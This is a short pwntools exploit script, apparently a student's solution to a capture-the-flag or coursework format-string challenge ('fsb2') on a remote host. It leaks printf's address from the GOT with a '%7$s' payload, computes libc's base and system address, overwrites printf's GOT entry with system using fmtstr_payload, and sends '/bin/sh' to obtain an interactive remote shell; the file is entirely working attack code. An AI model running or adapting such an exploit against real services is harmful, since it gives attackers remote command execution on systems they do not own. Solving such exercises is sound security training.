from pwn import *

context.arch = "amd64"
context.log_level = "debug"

p = remote("8.154.20.109", 10301)
# p = process("./fsb2")

elf = ELF("./fsb2")
libc = ELF("./libc.so")

p.sendlineafter(b"Please input your StudentID:\n", str(3220103544))
p.recv()
# fmt = FmtStr(execute_fmt=lambda payload: {
#     p.sendline(payload),
#     p.recvuntil('\n')
# })
offset = 6

payload1 = flat([
    b'%7$s'.ljust(8, b'\x00'),
    elf.got['printf']
])
p.sendline(payload1)

printf_addr = u64(p.recv(6).ljust(8, b'\x00'))

libc_base = printf_addr - libc.sym['printf']
system_addr = libc_base + libc.sym['system']

payload2 = fmtstr_payload(offset, {elf.got['printf']: system_addr})
p.sendline(payload2)

p.recv()

p.sendline(b'/bin/sh')
p.interactive()
